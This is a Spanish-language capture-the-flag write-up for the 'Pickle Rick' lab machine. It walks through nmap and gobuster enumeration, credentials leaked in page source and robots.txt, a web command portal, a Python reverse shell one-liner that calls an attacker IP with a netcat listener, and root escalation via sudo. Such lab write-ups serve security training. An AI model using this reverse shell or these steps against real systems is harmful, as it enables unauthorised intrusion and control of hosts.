# Rick.thm

## Introducción

Este informe detalla el proceso de enumeración y análisis inicial realizado sobre el host `rick.thm` (10.10.229.244) utilizando la herramienta Nmap. Se describen los hallazgos relevantes, los servicios expuestos, así como los pasos siguientes para la explotación y escalada de privilegios.

## 1. Escaneo de Puertos con Nmap

El primer paso fue realizar un escaneo de puertos con Nmap utilizando las opciones `-A -sT`, que permiten la detección avanzada de servicios y sistemas operativos. Se guardó la salida en un archivo `resultado.txt` para su posterior análisis.

### Comando utilizado:

```bash
nmap -A -sT rick.thm -oN resultado.txt
```

### Resultados obtenidos:

```markdown
Host: rick.thm (10.10.229.244)
Estado: Activo (latencia 0.18s)
Puertos abiertos:
- **22/tcp**: OpenSSH 8.2p1 (Ubuntu 4ubuntu0.11)
- **80/tcp**: Apache HTTP 2.4.41 (Ubuntu)
```

## 2. Análisis del Código Fuente del Sitio Web

Se encontró un comentario en el código fuente con el nombre de usuario:

![](pickle%20rick1.png)

```html
<!-- Username: R1ckRul3s -->
```

## 3. Exploración de Directorios con Gobuster

Se utilizó **Gobuster** para la búsqueda de directorios ocultos y archivos accesibles:

```bash
gobuster dir -u http://rick.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
```

### Resultados encontrados:

```markdown
/login.php            (Status: 200)
/index.html           (Status: 200)
/assets               (Status: 301)
/portal.php           (Status: 302) -> /login.php
/robots.txt           (Status: 200)
```

En `robots.txt`, se encontró la siguiente información:

```plaintext
WubbaLubbaDubDub
```

## 4. Autenticación en el Portal Web

Se intentó el acceso en `/login.php` con las credenciales:

- **Usuario:** `R1ckRul3s`
- **Contraseña:** `WubbaLubbaDubDub`

El acceso fue exitoso y se redirigió al portal `/portal.php`.

## 5. Descubrimiento de Archivos Mediante Comandos

![](pickle%20rick2.png)

Dentro del portal, en la pestaña **Commands**, se ejecutó `ls`, obteniendo:

```plaintext
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Dado que otros archivos estaban bloqueados, se intentó acceder directamente a `http://rick.thm/Sup3rS3cretPickl3Ingred.txt`, lo cual permitió encontrar el primer ingrediente.

## 6. Creación de una Consola de Conexión Remota

Para obtener acceso interactivo al sistema, se estableció una **reverse shell** utilizando Python.

### Comando utilizado en el servidor (Rick.thm):

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.17.22",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Configuración en la máquina atacante:

```bash
nc -lvnp 4444
```

Tras la ejecución de estos comandos, se logró acceso remoto al sistema.

## 7. Obtención de Información Clave

Al explorar el sistema, en la ruta `/home/rick/`, se encontró un archivo llamado **"second ingredients"**. Al visualizar su contenido, se obtuvo la clave secreta:

```plaintext
********
```

## 8. Escalada de Privilegios

Se detectó que el usuario podía ejecutar comandos con `sudo`, lo que permitió escalar privilegios con el siguiente comando:

```bash
sudo /bin/bash
```

Una vez en modo root, se accedió al archivo en `/root/3rd.txt`, obteniendo el último ingrediente:

```plaintext
**********
```

## 9. Conclusión y Pasos Finales

- Se logró acceso inicial al sistema mediante credenciales obtenidas en el código fuente.
- Se identificaron archivos clave en el sistema y se accedió a información sensible.
- Se escaló privilegios con `sudo` y se accedió al último ingrediente.
